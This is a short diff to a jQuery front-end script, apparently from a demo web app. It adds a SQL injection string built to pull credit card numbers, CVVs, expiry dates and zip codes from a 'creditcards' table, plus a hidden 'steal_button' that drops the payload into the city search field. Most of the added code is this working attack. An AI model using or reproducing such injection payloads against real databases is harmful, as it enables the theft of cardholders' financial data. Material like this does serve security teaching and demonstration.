@@ -1,3 +1,5 @@
+const injectionQuery = "';select concat('number: ', number, '<br/>cvv: ', cvv, '<br/>expdate: ', expmonth, '/', expyear, '<br/>zip: ', zip) as alias from creditcards where number <> '";
+
 $(document).ready(function() {
     $("#login_button").click(function() {
         $("#login_page").removeClass("open");
@@ -21,6 +23,14 @@ $(document).ready(function() {
             $("#results").empty();
             $("#dashboard_page").removeClass("searched");
         }, 400);
+    });
+
+    $("#advanced").click(function() {
+        $("#steal_button").addClass('visible');
+    });
+
+    $("#steal_button").click(function() {
+        $("#city").val(injectionQuery);
     });
 });
 
